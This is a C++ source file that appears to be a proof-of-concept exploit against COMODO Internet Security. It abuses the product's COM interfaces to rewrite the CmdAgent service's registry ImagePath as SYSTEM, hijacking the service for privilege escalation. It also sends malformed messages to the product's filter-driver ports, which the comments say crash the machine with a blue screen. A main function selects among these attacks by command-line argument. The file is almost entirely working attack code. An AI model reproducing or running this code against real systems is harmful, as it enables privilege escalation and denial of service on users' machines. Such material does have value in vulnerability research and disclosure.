// cmdServiceJack.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <Windows.h>
#include "CisHeader.h"
#include "NtStuff.h"

typedef BSTR(*TSysAllocString)(const OLECHAR* str);

void ReplaceCmdAgentService(const wchar_t* imagePath) {

	OleInitialize(NULL);

	// Set directory to load cavshell.dll and its current directory dependencies
	SetCurrentDirectory(L"C:\\Program Files\\COMODO\\COMODO Internet Security");
	TSysAllocString SysAllocString = (TSysAllocString)GetProcAddress(LoadLibrary(L"oleaut32.dll"), "SysAllocString");
	BSTR bRegPath = SysAllocString(L"SYSTEM\\CurrentControlSet\\Services");
	BSTR bRegKey = SysAllocString(L"CmdAgent");
	BSTR bRegValue = SysAllocString(L"ImagePath");
	BSTR bRegData = SysAllocString(imagePath);
	ISvcRegistryAccess* svcRegAccess;
	CisGate* classFactory = NULL;
	CisClassFactory* cisClassFactory = NULL, *out = NULL;
	IID empty = {};
	SvcRegKey* regInterface = NULL, *regWritter = NULL;
	IServiceProv* srvProv = NULL;
	IID IID_ICisGate, IID_ICisClassFactory, IID_ICisFacade, IID_ISvcRegistryAccess;
	BYTE* COMCallbacks = (BYTE*)LoadLibrary(L"cavshell.dll")+ 0x46F98;

	// Init IID strings
	wchar_t ICisGate_string[40], ICisClassFactory_string[40], ICisFacade_string[40], ISvcRegistryAccess_string[40];

	lstrcpynW(ICisGate_string, L"{C288AC5A-D846-4696-8028-2DF6F508D0D9}", 40);
	lstrcpynW(ICisClassFactory_string, L"{1220A5C3-9B6C-4A8A-ABE4-7CE6118384A9}", 40);
	lstrcpynW(ICisFacade_string, L"{A8F46273-16B9-4009-AF0F-2EFA988DD75D}", 40);
	lstrcpynW(ISvcRegistryAccess_string, L"{22DCF474-C7B3-4BF2-8002-47A03010E96A}", 40);

	// Convert IID strings to actual IIDs
	IIDFromString(ISvcRegistryAccess_string, &IID_ISvcRegistryAccess);
	IIDFromString(ICisGate_string, &IID_ICisGate);
	IIDFromString(ICisClassFactory_string, &IID_ICisClassFactory);
	IIDFromString(ICisFacade_string, &IID_ICisFacade);

	// Get IClassFactory object
	CoGetClassObject(IID_ICisGate, CLSCTX_LOCAL_SERVER, 0, IID_IClassFactory, (void**)&classFactory);

	// Create IServiceProvider Instance
	classFactory->QueryInterface(IID_ICisClassFactory, (void**)&cisClassFactory);
	cisClassFactory->CreateInstance(&COMCallbacks, 0, IID_IServiceProvider, (void**)&srvProv);

	// Acquire Interface to ISvcRegistry
	srvProv->GetIReg(empty, IID_ISvcRegistryAccess, (void**)&svcRegAccess);
	svcRegAccess->GetRegInterface(HKEY_LOCAL_MACHINE, bRegPath, (void**)&regInterface);

	// Convert to writtable registry interface
	regInterface->OpenWriteKey(bRegKey, 0, (void**)&regWritter);

	// Do registry write as SYSTEM
	regWritter->SetRegSz(bRegValue, bRegData);

	//
	regWritter->Release();
	regInterface->Release();
	svcRegAccess->Release();
	cisClassFactory->Release();
}

HANDLE ConnectPort(const wchar_t* portName) {
	HMODULE hFltLib = LoadLibrary(L"fltlib.dll");
	TFilterConnectCommunicationPort FilterConnectCommunicationPort = (TFilterConnectCommunicationPort)GetProcAddress(hFltLib, "FilterConnectCommunicationPort");

	HANDLE hCmdServicePort = NULL;
	FilterConnectCommunicationPort(portName, 0, 0, 0, NULL, &hCmdServicePort);
	return hCmdServicePort;
}

void SendPortMessage(HANDLE port, cmdPortMessage *msg, size_t inBufferSize, void* out, size_t outBufferSize) {
	DWORD returned;
	HMODULE hFltLib = LoadLibrary(L"fltlib.dll");
	TFilterSendMessage FilterSendMessage = (TFilterSendMessage)GetProcAddress(hFltLib, "FilterSendMessage");
	FilterSendMessage(port, msg, inBufferSize, out, outBufferSize, &returned);
}

void CrashGuiPort() {
	size_t allocSize = 0x10000;
	HANDLE hCmdGUIPort = ConnectPort(L"\\cmdGuiPort");
	BYTE out[0x1000];
	void* in = (void*)0x7FFFFFFe0000;
	VirtualAlloc(in, allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	BYTE* inAddr = (BYTE*)in + allocSize - 0x10;
	// BSOD
	SendPortMessage(hCmdGUIPort, (cmdPortMessage*)0x7FFFFFFefff8, 0x4, out, 0x734);
}

void CrashCmdServicePort() {
	size_t allocSize = 0x10000;
	HANDLE hCmdService = ConnectPort(L"\\cmdServicePort");
	cmdPortMessage cMsg;
	RtlSecureZeroMemory(&cMsg, sizeof(cMsg));
	void* out = (void*)0x7FFFFFFe0000;
	VirtualAlloc(out, allocSize, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	cMsg.p1 = 0x10000000;
	cMsg.p3 = 0x2;
	cMsg.p4 = 1;
	BYTE* outAddr = (BYTE*)out + allocSize - 0x20;
	// BSOD
	SendPortMessage(hCmdService, &cMsg, 0x1024, outAddr, 0x8);
}

int main()
{
	int nArgs;
	LPWSTR* args = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (nArgs < 2)
		return -1;

	if (!lstrcmpiW(args[1], L"crashServicePort")) {
		CrashCmdServicePort();
	}
	else if (!lstrcmpiW(args[1], L"crashGuiPort")) {
		CrashGuiPort();
	}
	else if (!lstrcmpiW(args[1], L"hijackService")) {
		if (nArgs > 2)
			ReplaceCmdAgentService(args[2]);
	}

	return 0;
}
